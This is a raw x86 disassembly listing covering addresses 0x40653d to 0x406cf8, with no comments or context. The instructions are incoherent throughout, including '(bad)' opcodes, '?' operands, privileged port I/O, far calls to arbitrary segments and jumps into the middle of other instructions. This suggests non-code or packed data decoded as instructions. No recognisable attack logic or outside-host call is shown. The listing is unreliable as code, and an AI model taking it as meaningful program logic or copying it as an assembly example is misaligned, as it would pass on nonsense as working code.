  40653d:	fisttp QWORD PTR [esi+eax*2+0x3b2fe805]
  406544:	inc    eax
  406545:	pop    es
  406546:	and    al,0x70
  406548:	aam    0xa7
  40654a:	or     eax,0xc18feee5
  40654f:	or     BYTE PTR cs:[ecx+ebp*1],ch
  406553:	out    0x80,eax
  406555:	inc    edi
  406556:	adc    ebp,edi
  406558:	push   ecx
  406559:	sub    ebp,DWORD PTR [ecx]
  40655b:	nop
  40655c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40655d:	setp   BYTE PTR [edx-0x49bb142d]
  406564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406565:	inc    ebx
  406566:	or     eax,0xeed5c758
  40656b:	jmp    0xa4706ce2
  406570:	add    esp,edi
  406572:	cli    
  406573:	repnz add al,0xcf
  406576:	xchg   edx,eax
  406577:	das    
  406578:	cmp    al,BYTE PTR [ecx]
  40657a:	dec    esp
  40657b:	sbb    ebp,0xcfc115c9
  406581:	shr    BYTE PTR [edx+0x4e],1
  406584:	xor    eax,0x353826f3
  406589:	ins    DWORD PTR es:[edi],dx
  40658a:	mov    ch,0x6
  40658c:	mov    dl,0x8e
  40658e:	rcl    DWORD PTR [ecx+0x4dc4c49a],0x6b
  406595:	cmp    BYTE PTR [eax+0x7],al
  406598:	pop    esi
  406599:	ds mov esi,edx
  40659c:	mov    esp,0x80df535f
  4065a1:	mov    ebp,DWORD PTR [esi+ebx*8-0xa]
  4065a5:	ficomp DWORD PTR [esi]
  4065a7:	inc    ebp
  4065a8:	adc    edx,DWORD PTR [ebp+0x68]
  4065ab:	outs   dx,BYTE PTR ds:[esi]
  4065ac:	in     ax,0xa3
  4065af:	pushf  
  4065b0:	stos   BYTE PTR es:[edi],al
  4065b1:	call   0xf691:0xa4b064b4
  4065b8:	xor    eax,0x7da4459e
  4065bd:	cmp    eax,0x5222de60
  4065c2:	push   edx
  4065c3:	fwait
  4065c4:	into   
  4065c5:	retf   0x5383
  4065c8:	or     DWORD PTR [ecx-0x66],ebx
  4065cb:	xlat   BYTE PTR ds:[ebx]
  4065cc:	fnstenv [edx]
  4065ce:	jno    0x40658b
  4065d0:	lods   al,BYTE PTR ds:[esi]
  4065d1:	popf   
  4065d2:	mul    BYTE PTR [eax-0x5b844d47]
  4065d8:	scas   eax,DWORD PTR es:[edi]
  4065d9:	xor    BYTE PTR [esi],0x3e
  4065dc:	ds jns 0x40664d
  4065df:	sub    bl,BYTE PTR [esi-0x6b0e9812]
  4065e5:	mov    edi,0x36dd6feb
  4065ea:	aam    0x4b
  4065ec:	lahf   
  4065ed:	or     al,0x24
  4065ef:	mov    WORD PTR [ebx-0x5cf883d7],?
  4065f5:	pop    ds
  4065f6:	leave  
  4065f7:	loop   0x406641
  4065f9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4065fb:	jge    0x40659f
  4065fd:	cmp    cl,BYTE PTR [edi+0x41]
  406600:	push   ds
  406601:	test   esi,ecx
  406603:	js     0x40662b
  406605:	std    
  406606:	int3   
  406607:	std    
  406608:	iret   
  406609:	sub    DWORD PTR [ecx-0x6b68fa3],esi
  40660f:	ins    BYTE PTR es:[edi],dx
  406610:	or     eax,0x2d493ebd
  406615:	mov    al,ds:0x29bd96cf
  40661a:	gs arpl sp,ax
  40661d:	mov    es,WORD PTR [ecx+ebp*2]
  406620:	xlat   BYTE PTR ds:[ebx]
  406621:	pop    ebx
  406622:	sbb    bl,dl
  406624:	mov    edi,0xd906b0f3
  406629:	mov    ch,0x74
  40662b:	or     dl,BYTE PTR ds:0xcca6635b
  406631:	in     al,0x97
  406633:	sbb    eax,0x35488d33
  406638:	mov    edi,0x2f71e9cd
  40663d:	sub    BYTE PTR [eax-0x3cb132d],dh
  406643:	jp     0x4065fc
  406645:	inc    ebp
  406646:	lock js 0x406638
  406649:	or     ebp,ebp
  40664b:	sub    DWORD PTR [edi-0x60],0xeadf3e52
  406652:	dec    ebx
  406653:	or     eax,0x931e6ba1
  406658:	into   
  406659:	xor    al,0x8d
  40665b:	inc    edi
  40665c:	in     eax,0xde
  40665e:	mov    esi,DWORD PTR [eax+ebp*8]
  406661:	sub    ebp,ebx
  406663:	mov    esi,0xa3bebd2f
  406668:	enter  0xae7a,0x6b
  40666c:	cld    
  40666d:	xchg   edi,eax
  40666e:	xor    eax,0x1602731a
  406673:	pop    ebx
  406674:	ds xchg esi,eax
  406676:	hlt    
  406677:	aam    0xda
  406679:	push   eax
  40667a:	fstp   DWORD PTR [ebx-0x76]
  40667d:	pusha  
  40667e:	nop
  40667f:	pop    edx
  406680:	xchg   edi,eax
  406681:	imul   ebp,ebp,0x45
  406684:	inc    eax
  406685:	pop    esp
  406686:	fild   DWORD PTR [ebp-0x45]
  406689:	push   eax
  40668a:	stc    
  40668b:	nop
  40668c:	jno    0x406628
  40668e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40668f:	xor    DWORD PTR [ebp-0x15148c3f],eax
  406695:	cmp    eax,0xc7140529
  40669a:	outs   dx,DWORD PTR ds:[esi]
  40669b:	pop    esi
  40669c:	mov    esp,0x2ae3e873
  4066a1:	sbb    BYTE PTR ds:0xa06c3f35,dl
  4066a7:	pop    ebx
  4066a8:	out    0x8a,eax
  4066aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ac:	inc    edx
  4066ad:	aaa    
  4066ae:	adc    BYTE PTR [esi-0x5a72d273],0x7c
  4066b5:	push   edx
  4066b6:	or     eax,esp
  4066b8:	rcr    DWORD PTR [edi-0xd],1
  4066bb:	mov    ch,0x1b
  4066bd:	add    esp,ecx
  4066bf:	dec    edx
  4066c0:	cmp    al,0xf8
  4066c2:	fcmove st,st(2)
  4066c4:	mov    ebx,0x70f12d15
  4066c9:	xchg   esp,eax
  4066ca:	cli    
  4066cb:	into   
  4066cc:	data16 repnz sub al,0xf
  4066d0:	or     eax,0xbf7b781a
  4066d5:	jp     0x4066a3
  4066d7:	inc    edx
  4066d8:	mov    esi,0xf8797866
  4066dd:	push   esp
  4066de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066df:	das    
  4066e0:	scas   al,BYTE PTR es:[edi]
  4066e1:	fwait
  4066e2:	es mov eax,0xc07772ae
  4066e8:	pop    ebp
  4066e9:	push   edi
  4066ea:	and    bl,BYTE PTR [edi-0x2d]
  4066ed:	mov    eax,ds:0xed3d8f09
  4066f2:	cmp    DWORD PTR [ebx],0xffffff8d
  4066f5:	pop    ss
  4066f6:	rcl    edi,cl
  4066f8:	or     eax,0xee2ebe04
  4066fd:	jmp    0x7eef:0x60c3344b
  406704:	cli    
  406705:	push   0x4dea2587
  40670a:	xchg   ebx,eax
  40670b:	test   al,0x1e
  40670d:	push   esi
  40670e:	jge    0x4066e7
  406710:	fst    QWORD PTR ds:0x92617b6c
  406716:	test   DWORD PTR [ecx+0x14b91077],ebx
  40671c:	pop    esp
  40671d:	mov    esp,esi
  40671f:	sbb    DWORD PTR ds:0xce5b4dc5,ecx
  406725:	jecxz  0x40675b
  406727:	xchg   esp,eax
  406728:	ret    
  406729:	xchg   ebx,eax
  40672a:	jle    0x406738
  40672c:	pop    edx
  40672d:	mov    ch,0xfd
  40672f:	xor    BYTE PTR [edx+0x1a],dh
  406732:	push   eax
  406733:	sbb    ch,BYTE PTR [ebx+0x56]
  406736:	bound  ecx,QWORD PTR [edx+0x2233e74a]
  40673c:	js     0x406703
  40673e:	sub    eax,0xdcd1399c
  406743:	mov    BYTE PTR [edx-0x6a5f16d7],ah
  406749:	leave  
  40674a:	fs lock adc al,0x1e
  40674e:	sahf   
  40674f:	es pop ebx
  406751:	cwde   
  406752:	mov    DWORD PTR [esi-0x4fd0d081],0xb3c7b458
  40675c:	jae    0x4067c1
  40675e:	lock push esp
  406760:	xchg   esp,eax
  406761:	popa   
  406762:	mov    WORD PTR [esi+ecx*8],cs
  406765:	add    cl,dl
  406767:	into   
  406768:	clc    
  406769:	and    al,0xaf
  40676b:	icebp  
  40676c:	out    0x4e,al
  40676e:	sar    ebp,cl
  406770:	mov    bl,0x15
  406772:	dec    edi
  406773:	mov    esi,0x25fe9a31
  406778:	stos   DWORD PTR es:[edi],eax
  406779:	sub    BYTE PTR [eax+0x34],bh
  40677c:	jne    0x406708
  40677e:	scas   eax,DWORD PTR es:[edi]
  40677f:	pop    eax
  406780:	jb     0x406792
  406782:	xor    eax,0x9f6fa6e3
  406787:	dec    esi
  406788:	cdq    
  406789:	or     dl,BYTE PTR [edx+0x5ffbb5a2]
  40678f:	mov    bh,0xee
  406791:	or     bh,0x8e
  406794:	popf   
  406795:	jbe    0x40677f
  406797:	cli    
  406798:	ret    0xb216
  40679b:	sub    al,0x85
  40679d:	cs cs pop eax
  4067a0:	icebp  
  4067a1:	ins    BYTE PTR es:[edi],dx
  4067a2:	shr    DWORD PTR [edi],1
  4067a4:	push   cs
  4067a5:	cmp    eax,0xe4939ac4
  4067aa:	sahf   
  4067ab:	dec    edx
  4067ac:	cdq    
  4067ad:	and    cl,BYTE PTR [edi+0x326f927d]
  4067b3:	mov    eax,ds:0xa483917f
  4067b8:	adc    BYTE PTR [ebp+ebp*2+0x33caf483],bl
  4067bf:	cmp    ah,BYTE PTR [edx+0x517c39f6]
  4067c5:	push   0xa5cb7914
  4067ca:	adc    dh,BYTE PTR [eax]
  4067cc:	sbb    BYTE PTR [edi],0xca
  4067cf:	dec    edx
  4067d0:	push   ss
  4067d1:	lods   al,BYTE PTR ds:[esi]
  4067d2:	ret    0xd6be
  4067d5:	adc    eax,0xcb0619c4
  4067da:	pusha  
  4067db:	and    esi,esp
  4067dd:	sub    DWORD PTR [eax+0x51958d39],ecx
  4067e3:	or     al,0x1
  4067e5:	sub    BYTE PTR [ebp+edi*4+0x31cd2cc0],0xc2
  4067ed:	mov    DWORD PTR [edx+0x5],edi
  4067f0:	cs std 
  4067f2:	push   esp
  4067f3:	(bad)  
  4067f5:	push   esi
  4067f6:	jae    0x4067da
  4067f8:	bnd jle 0x406870
  4067fb:	ins    DWORD PTR es:[edi],dx
  4067fc:	inc    esp
  4067fd:	ins    DWORD PTR es:[edi],dx
  4067fe:	mov    ah,al
  406800:	lea    esi,[esi+0x662e5daf]
  406806:	push   es
  406807:	cmp    BYTE PTR [esi+0x26],ch
  40680a:	jle    0x4067f0
  40680c:	or     edi,DWORD PTR [ebx-0x5b]
  40680f:	sbb    DWORD PTR ds:0xf70977ec,ebp
  406815:	cdq    
  406816:	and    BYTE PTR [ecx],ch
  406818:	pop    DWORD PTR [edx+0x5d]
  40681b:	push   eax
  40681c:	out    dx,al
  40681d:	pushf  
  40681e:	outs   dx,BYTE PTR ds:[esi]
  40681f:	mov    eax,ds:0x5dd328a1
  406824:	into   
  406825:	push   esp
  406826:	jmp    0x181d047b
  40682b:	adc    bh,BYTE PTR [ebp+esi*4-0x37cdbc69]
  406832:	sbb    esp,DWORD PTR [esi-0x40]
  406835:	cdq    
  406836:	xchg   edi,eax
  406837:	mov    WORD PTR [esi+esi*1],ss
  40683a:	adc    BYTE PTR [ebx+esi*1-0x5a698a0c],al
  406841:	mov    eax,ds:0x45b84d8e
  406846:	cmp    BYTE PTR [edx-0x64d05b52],0x73
  40684d:	call   0xb08a:0x122ef7be
  406854:	sti    
  406855:	mov    cl,BYTE PTR [esi-0x62]
  406858:	loop   0x4068d5
  40685a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40685b:	pop    ds
  40685c:	and    al,BYTE PTR [edx]
  40685e:	test   al,0x2c
  406860:	adc    ebx,DWORD PTR [ebx-0x1f57cb27]
  406866:	jae    0x40685f
  406868:	gs iret 
  40686a:	in     eax,0xc4
  40686c:	jae    0x406883
  40686e:	stc    
  40686f:	ins    DWORD PTR es:[edi],dx
  406870:	sbb    DWORD PTR [eax],0xfffffff1
  406873:	in     eax,dx
  406874:	adc    eax,0x37450f04
  406879:	fisttp WORD PTR [edx]
  40687b:	and    ah,BYTE PTR ds:0x5b2ef3b4
  406881:	sub    DWORD PTR [eax],0x50
  406884:	in     al,dx
  406885:	stos   BYTE PTR es:[edi],al
  406886:	and    al,BYTE PTR [eax+0x19c8c71e]
  40688c:	mov    ?,WORD PTR [ecx+edi*2+0x1f2a9990]
  406893:	retf   
  406894:	pop    esi
  406895:	mov    ch,0xd6
  406897:	dec    eax
  406898:	ins    BYTE PTR es:[edi],dx
  406899:	and    ebp,0xfee11d9
  40689f:	xor    DWORD PTR ds:0xd6a4aab3,0xffffff97
  4068a6:	pop    esp
  4068a7:	xchg   DWORD PTR [ecx+0x24d4126f],edi
  4068ad:	sbb    ah,bh
  4068af:	jp     0x40684e
  4068b1:	xchg   edi,eax
  4068b2:	iret   
  4068b3:	imul   ebx,DWORD PTR [ecx+0x56e1a822],0x120186f0
  4068bd:	push   ebx
  4068be:	sub    ebx,DWORD PTR [ecx+0x407962a3]
  4068c4:	shl    BYTE PTR [edi+0x5047333b],cl
  4068ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068cb:	inc    ebx
  4068cc:	outs   dx,BYTE PTR ds:[esi]
  4068cd:	ins    BYTE PTR es:[edi],dx
  4068ce:	jbe    0x4068c2
  4068d0:	ret    0xab1e
  4068d3:	sub    ecx,DWORD PTR [ebp-0x2008189a]
  4068d9:	sbb    al,0x59
  4068db:	das    
  4068dc:	pop    ebp
  4068dd:	aas    
  4068de:	pop    edi
  4068df:	ins    DWORD PTR es:[edi],dx
  4068e0:	addr16 (bad) 
  4068e2:	in     eax,dx
  4068e3:	inc    edi
  4068e4:	pushf  
  4068e5:	bnd ja 0x4068e1
  4068e8:	(bad)  
  4068e9:	rol    BYTE PTR [esp+edi*1],0x32
  4068ed:	retf   
  4068ee:	outs   dx,BYTE PTR ds:[esi]
  4068ef:	rcl    DWORD PTR [esi+0x4d],cl
  4068f2:	sti    
  4068f3:	mov    DWORD PTR [edi+esi*8-0x4cb11ae2],edx
  4068fa:	fdiv   st,st(1)
  4068fc:	out    0x4c,al
  4068fe:	push   0xffffff97
  406900:	in     eax,dx
  406901:	(bad)  
  406902:	mov    esi,0xc915af89
  406907:	sub    ecx,edi
  406909:	xchg   DWORD PTR [eax],ebp
  40690b:	in     eax,dx
  40690c:	mov    al,ds:0x34e81171
  406911:	inc    ebx
  406912:	dec    ebp
  406913:	imul   ecx,DWORD PTR [ebx+0xb],0x6f29dcde
  40691a:	gs pop ebx
  40691c:	lds    edx,FWORD PTR [ebx+0x1f557b45]
  406922:	pop    ebx
  406923:	(bad)  [edx+edi*2]
  406926:	ret    
  406927:	je     0x4068c3
  406929:	pusha  
  40692a:	add    DWORD PTR [edx-0x44],0x3f7eea02
  406931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406932:	cmp    edi,DWORD PTR [ebx-0x73a6fba7]
  406938:	add    dh,ah
  40693a:	mov    eax,0x16e1ed18
  40693f:	loop   0x406908
  406941:	mov    dh,0x56
  406943:	lds    ecx,FWORD PTR [esi]
  406945:	or     al,0xe1
  406947:	or     al,BYTE PTR [edi+edx*8+0x46]
  40694b:	xor    eax,0xce02ee4f
  406950:	pushf  
  406951:	cmp    dh,dh
  406953:	xchg   edi,eax
  406954:	popa   
  406955:	add    eax,0x753b7895
  40695a:	lods   eax,DWORD PTR ds:[esi]
  40695b:	fadd   DWORD PTR [ebx]
  40695d:	adc    BYTE PTR [edi],bh
  40695f:	enter  0xe57b,0x2
  406963:	lods   al,BYTE PTR ds:[esi]
  406964:	push   ss
  406965:	lea    esp,[ebp+0x47]
  406968:	push   0xa16e85e4
  40696d:	outs   dx,BYTE PTR ds:[esi]
  40696e:	iret   
  40696f:	out    dx,eax
  406970:	cs cmp al,0xa9
  406973:	pop    es
  406974:	cdq    
  406975:	jnp    0x406916
  406977:	scas   al,BYTE PTR es:[edi]
  406978:	add    eax,DWORD PTR [edi]
  40697a:	add    DWORD PTR [eax+0xa821b5b],ecx
  406980:	pop    edx
  406981:	(bad)  
  406982:	jg     0x4069f4
  406984:	shl    al,0xcd
  406987:	(bad)  
  406989:	imul   edx,DWORD PTR [edi+0x2c1c9106],0x52
  406990:	mov    esp,0x2fc64ea6
  406995:	mov    al,0x99
  406997:	xchg   BYTE PTR [esi],ah
  406999:	mov    esi,0x9ffd8d64
  40699e:	xchg   DWORD PTR [ebx+0x52a9a66d],ebp
  4069a4:	xchg   edx,eax
  4069a5:	push   cs
  4069a6:	ja     0x4069f4
  4069a8:	add    esi,DWORD PTR [ecx-0xb]
  4069ab:	dec    ebp
  4069ac:	gs aaa 
  4069ae:	pop    ebp
  4069af:	mov    bl,0x9c
  4069b1:	jns    0x406994
  4069b3:	or     al,0x4d
  4069b5:	ss jge 0x4069ac
  4069b8:	mov    ecx,0xda67a270
  4069bd:	sub    al,ch
  4069bf:	imul   edx,DWORD PTR [esi+0x7c],0xffffffe7
  4069c3:	sbb    eax,0xb4fd6f58
  4069c8:	data16 ja 0x406a2e
  4069cb:	lock jl 0x40698d
  4069ce:	int    0xc8
  4069d0:	or     DWORD PTR [eax-0x48],edx
  4069d3:	sti    
  4069d4:	or     dh,ch
  4069d6:	gs dec eax
  4069d8:	push   ecx
  4069d9:	int3   
  4069da:	cwde   
  4069db:	or     bl,cl
  4069dd:	into   
  4069de:	mov    al,0xe1
  4069e0:	mov    gs,WORD PTR [edi+ecx*1+0x7f]
  4069e4:	dec    edi
  4069e5:	in     eax,0x3c
  4069e7:	xchg   ecx,eax
  4069e8:	test   eax,0x6387a52d
  4069ed:	(bad)  
  4069ee:	jg     0x406a3d
  4069f0:	inc    ebx
  4069f1:	xchg   esp,eax
  4069f2:	fisub  DWORD PTR [ecx-0x50]
  4069f5:	mov    ds:0x80be3b0e,eax
  4069fa:	dec    esi
  4069fb:	xor    DWORD PTR [ecx-0x70],ebp
  4069fe:	ret    0x3f5c
  406a01:	retf   0x6719
  406a04:	mov    al,BYTE PTR [ecx-0x1e]
  406a07:	mov    bh,BYTE PTR [esi+0x17]
  406a0a:	cmp    al,0xd4
  406a0c:	loop   0x4069a4
  406a0e:	lods   eax,DWORD PTR ds:[esi]
  406a0f:	ins    BYTE PTR es:[edi],dx
  406a10:	cmp    bh,BYTE PTR [eax+esi*1-0x66]
  406a14:	mov    ecx,0x18874ab5
  406a19:	in     al,0x37
  406a1b:	pop    edi
  406a1c:	or     dh,ah
  406a1e:	sbb    BYTE PTR [edx+0x21],al
  406a21:	fmul   st,st(4)
  406a23:	adc    BYTE PTR [ecx],dl
  406a25:	xchg   edi,eax
  406a26:	bound  ebp,QWORD PTR fs:[edx-0x5cbec540]
  406a2d:	out    dx,al
  406a2e:	rol    BYTE PTR [esi+0x3d],1
  406a31:	rol    DWORD PTR [edx],1
  406a33:	inc    ecx
  406a34:	verr   WORD PTR [ecx]
  406a37:	ins    BYTE PTR es:[edi],dx
  406a38:	in     eax,0x83
  406a3a:	xor    ebx,DWORD PTR [ebx+0x52]
  406a3d:	je     0x4069f0
  406a3f:	clc    
  406a40:	in     al,0xec
  406a42:	and    DWORD PTR [ecx],esi
  406a44:	push   ecx
  406a45:	or     al,0x29
  406a47:	shl    BYTE PTR [edx+0x63f85f03],0x4c
  406a4e:	mov    ds:0xbc10ce41,eax
  406a53:	out    0xdf,eax
  406a55:	gs push 0xffffffd9
  406a58:	leave  
  406a59:	mov    WORD PTR [esi+0x6f],?
  406a5c:	(bad)  
  406a5d:	jns    0x406a45
  406a5f:	push   eax
  406a60:	stc    
  406a61:	shl    BYTE PTR [edx+0x1262e9c2],1
  406a67:	fcmovu st,st(6)
  406a69:	je     0x406aa3
  406a6b:	sti    
  406a6c:	mov    al,ds:0xed23a255
  406a71:	xchg   esi,eax
  406a72:	adc    bl,BYTE PTR [edi]
  406a74:	rcl    DWORD PTR [ebx+eiz*2-0xafc94],0xe4
  406a7c:	push   ecx
  406a7d:	hlt    
  406a7e:	xchg   ebx,eax
  406a7f:	repnz icebp 
  406a81:	xchg   ecx,eax
  406a82:	shr    DWORD PTR [edi],1
  406a84:	sbb    eax,0xc697969
  406a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a8a:	jge    0x406b06
  406a8c:	adc    eax,0x4fa04980
  406a91:	mov    dl,0xb2
  406a93:	out    0xcb,al
  406a95:	adc    al,dl
  406a97:	in     eax,0x50
  406a99:	dec    edx
  406a9a:	cdq    
  406a9b:	mov    dh,BYTE PTR [esi+ebp*4-0x48]
  406a9f:	push   ecx
  406aa0:	test   eax,0xa31f5048
  406aa5:	dec    edi
  406aa6:	adc    eax,0xc8dde11a
  406aab:	sar    BYTE PTR [edx-0x760b7e9f],0x58
  406ab2:	aas    
  406ab3:	call   0xe0ad0b4e
  406ab8:	push   ebp
  406ab9:	xchg   esp,eax
  406aba:	pop    ss
  406abb:	clc    
  406abc:	enter  0x587,0x8b
  406ac0:	xchg   edi,eax
  406ac1:	lds    esi,FWORD PTR [edi+0x8]
  406ac4:	push   ss
  406ac5:	jle    0x406a81
  406ac7:	pop    edx
  406ac8:	inc    ebp
  406ac9:	loope  0x406b13
  406acb:	call   DWORD PTR ds:0xc31e53fd
  406ad1:	leave  
  406ad2:	push   cs
  406ad3:	(bad)  
  406ad4:	stos   BYTE PTR es:[edi],al
  406ad5:	pushf  
  406ad6:	cli    
  406ad7:	(bad)  
  406ad8:	pop    esi
  406ad9:	(bad)  
  406ada:	call   0x23e14c35
  406adf:	pop    eax
  406ae0:	lahf   
  406ae1:	ins    DWORD PTR es:[edi],dx
  406ae2:	popa   
  406ae3:	or     edi,DWORD PTR [ecx]
  406ae5:	imul   edi,ebp,0x66
  406ae8:	mov    DWORD PTR [eax-0x4491990f],0xf13e1eec
  406af2:	test   al,0xaf
  406af4:	in     al,0xbc
  406af6:	and    al,BYTE PTR [ebx+0x7d1689c0]
  406afc:	inc    ecx
  406afd:	out    0xed,al
  406aff:	stos   DWORD PTR es:[edi],eax
  406b00:	jle    0x406a84
  406b02:	mov    al,0x2c
  406b04:	cmp    eax,0x5a371953
  406b09:	jmp    0x708a1623
  406b0e:	(bad)  
  406b0f:	mov    al,0x1f
  406b11:	out    0xf9,al
  406b13:	(bad)  [esi-0x47]
  406b16:	aad    0x8a
  406b18:	sub    edi,DWORD PTR [ebp-0x27]
  406b1b:	add    eax,0xd3020875
  406b20:	clc    
  406b21:	mov    ds:0xdbb40cf4,eax
  406b26:	add    al,0x24
  406b28:	or     esi,DWORD PTR [ebp+esi*2-0x32]
  406b2c:	dec    edx
  406b2d:	adc    bh,bh
  406b2f:	aad    0x14
  406b31:	(bad)  
  406b32:	jg     0x406b26
  406b34:	sub    dl,cl
  406b36:	stos   BYTE PTR es:[edi],al
  406b37:	sub    BYTE PTR [edx],bl
  406b39:	ffree  st(6)
  406b3b:	jecxz  0x406b8a
  406b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b3e:	push   esp
  406b3f:	adc    bl,cl
  406b41:	dec    esp
  406b42:	repz mov WORD PTR [ebx-0xe],fs
  406b46:	fstp   DWORD PTR [esi+eax*2]
  406b49:	ja     0x406b33
  406b4b:	pop    ebx
  406b4c:	in     eax,dx
  406b4d:	aas    
  406b4e:	mov    es,WORD PTR [eax+ebp*8-0x21d16764]
  406b55:	js     0x406bc1
  406b57:	outs   dx,BYTE PTR ds:[esi]
  406b58:	inc    edx
  406b59:	(bad)  
  406b5a:	or     eax,0x57869d1a
  406b5f:	call   0x54ba:0x847b9e97
  406b66:	pop    edi
  406b67:	aad    0x6d
  406b69:	cli    
  406b6a:	push   esp
  406b6b:	repz adc DWORD PTR [esi-0x54],0xffffff91
  406b70:	fisub  WORD PTR [edi]
  406b72:	add    bl,bh
  406b74:	jmp    0x9adef7e9
  406b79:	aaa    
  406b7a:	daa    
  406b7b:	clc    
  406b7c:	pop    ebp
  406b7d:	mov    al,0x23
  406b7f:	inc    esi
  406b80:	jge    0x406bf8
  406b82:	sub    eax,0xb3bd5366
  406b87:	mov    ds:0xc3fa3048,al
  406b8c:	sahf   
  406b8d:	mov    eax,ds:0xdd417142
  406b92:	dec    esp
  406b93:	rcl    DWORD PTR [ebx-0xe8037e0],1
  406b99:	in     al,0x5
  406b9b:	cdq    
  406b9c:	mov    DWORD PTR [ecx+eiz*2-0x66],eax
  406ba0:	xchg   cl,bh
  406ba2:	adc    eax,0x8db9cae6
  406ba7:	icebp  
  406ba8:	cmp    esi,DWORD PTR [edi-0x22]
  406bab:	sahf   
  406bac:	inc    esp
  406bad:	jmp    0x406b97
  406baf:	xor    bl,cl
  406bb1:	xor    eax,0xcfe2a5da
  406bb6:	xchg   ebx,eax
  406bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bb8:	out    dx,al
  406bb9:	stos   DWORD PTR es:[edi],eax
  406bba:	mov    WORD PTR [ebp+esi*8+0xe0e5525],es
  406bc1:	cmp    eax,0x2838372b
  406bc6:	cld    
  406bc7:	mov    ebp,0x2234314d
  406bcc:	cmc    
  406bcd:	add    edx,DWORD PTR [ecx]
  406bcf:	mov    esi,0x7ff72b44
  406bd4:	pop    esi
  406bd5:	jb     0x406bde
  406bd7:	mov    WORD PTR [edi+0x5d],?
  406bda:	sbb    eax,0x30d48fdd
  406bdf:	std    
  406be0:	mov    esi,0xbbe1aa9f
  406be5:	jb     0x406b91
  406be7:	adc    DWORD PTR [ebx-0x3c],edx
  406bea:	je     0x406b8b
  406bec:	xor    eax,0xa9594039
  406bf1:	stos   BYTE PTR es:[edi],al
  406bf2:	jle    0x406c10
  406bf4:	lods   eax,DWORD PTR ds:[esi]
  406bf5:	loop   0x406c48
  406bf7:	mov    bh,0x7d
  406bf9:	push   ss
  406bfa:	mov    ds:0x50f88872,eax
  406bff:	ret    0x7a41
  406c02:	sti    
  406c03:	movhps QWORD PTR [edx+0x1a5a3065],xmm1
  406c0a:	xor    ch,BYTE PTR [eax+0x30df3621]
  406c10:	sbb    DWORD PTR [edx-0x9],ecx
  406c13:	lods   al,BYTE PTR ds:[esi]
  406c14:	in     eax,0xaa
  406c16:	lahf   
  406c17:	test   eax,0x39c68f11
  406c1c:	dec    bl
  406c1e:	mov    esp,0x22a427d1
  406c23:	aas    
  406c24:	mov    ecx,0xfba7343c
  406c29:	xchg   edi,eax
  406c2a:	dec    ebp
  406c2b:	pushf  
  406c2c:	sbb    al,0x77
  406c2e:	adc    bl,dh
  406c30:	sub    ecx,DWORD PTR [eax+0x6b]
  406c33:	out    0xd9,al
  406c35:	cmp    DWORD PTR [eax],ecx
  406c37:	mov    ds:0x7c0c80ed,eax
  406c3c:	xor    ecx,DWORD PTR [esi+0x562a1b3a]
  406c42:	mov    ebx,0xf014fa0f
  406c47:	dec    esp
  406c48:	add    DWORD PTR [edx-0x342380e6],eax
  406c4e:	jg     0x406cb2
  406c50:	icebp  
  406c51:	out    0xd1,eax
  406c53:	mov    edi,0xa8cbe0f1
  406c58:	adc    ch,BYTE PTR [ebx]
  406c5a:	fcom   DWORD PTR [edi-0x27]
  406c5d:	adc    eax,0xfed85987
  406c62:	and    ebp,DWORD PTR [ecx]
  406c64:	push   esi
  406c65:	pop    esi
  406c66:	fcomp  QWORD PTR [edi-0x2c0198bd]
  406c6c:	fst    QWORD PTR [ebx+edi*4]
  406c6f:	and    DWORD PTR [eax-0x35],ebx
  406c72:	repz fidiv DWORD PTR [edi]
  406c75:	jns    0x406cc1
  406c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c78:	imul   edi,esi,0x4e
  406c7b:	or     al,0xc9
  406c7d:	aad    0x9a
  406c7f:	inc    eax
  406c80:	enter  0xab67,0xdc
  406c84:	mov    edx,0xc45cb712
  406c89:	pop    es
  406c8a:	into   
  406c8b:	rcl    DWORD PTR [edx+0x1d],cl
  406c8e:	mov    eax,0x54ba231d
  406c93:	dec    ebp
  406c94:	inc    eax
  406c95:	cs iret 
  406c97:	aad    0xf0
  406c99:	pop    ecx
  406c9a:	jns    0x406c53
  406c9c:	push   edi
  406c9d:	movhps xmm6,QWORD PTR [edx+0x128e8b54]
  406ca4:	add    ebx,DWORD PTR [edx+0x12]
  406ca7:	pop    ds
  406ca8:	ror    BYTE PTR [ebx+0x56f0dae9],cl
  406cae:	inc    ebp
  406caf:	out    dx,eax
  406cb0:	sahf   
  406cb1:	cmp    eax,0x3f13bd30
  406cb6:	sbb    BYTE PTR [ebp+0x3f],dh
  406cb9:	inc    esi
  406cba:	and    BYTE PTR [esi],dl
  406cbc:	push   ds
  406cbd:	push   es
  406cbe:	std    
  406cbf:	popa   
  406cc0:	push   DWORD PTR [ebx-0x7210bb04]
  406cc6:	pushf  
  406cc7:	stos   DWORD PTR es:[edi],eax
  406cc8:	sbb    BYTE PTR [edx+0x79eabcc4],bl
  406cce:	mov    cl,BYTE PTR [ebp+0x47f39cb8]
  406cd4:	arpl   WORD PTR [ecx-0x7f],di
  406cd7:	cmp    al,0xbf
  406cd9:	sbb    al,0x9c
  406cdb:	scas   eax,DWORD PTR es:[edi]
  406cdc:	and    al,0xf4
  406cde:	xlat   BYTE PTR ds:[ebx]
  406cdf:	xor    DWORD PTR [eax],eax
  406ce1:	pop    ds
  406ce2:	shl    BYTE PTR [ecx+0x72],1
  406ce5:	sbb    BYTE PTR [eax],al
  406ce7:	push   ecx
  406ce8:	xlat   BYTE PTR ds:[ebx]
  406ce9:	jns    0x406d00
  406ceb:	sar    dl,1
  406ced:	push   esp
  406cee:	mov    ch,BYTE PTR [esi-0x132b5926]
  406cf4:	push   ds
  406cf5:	fimul  DWORD PTR [edx]
  406cf7:	xchg   ebp,eax
  406cf8:	fmul   QWORD PTR [edx]
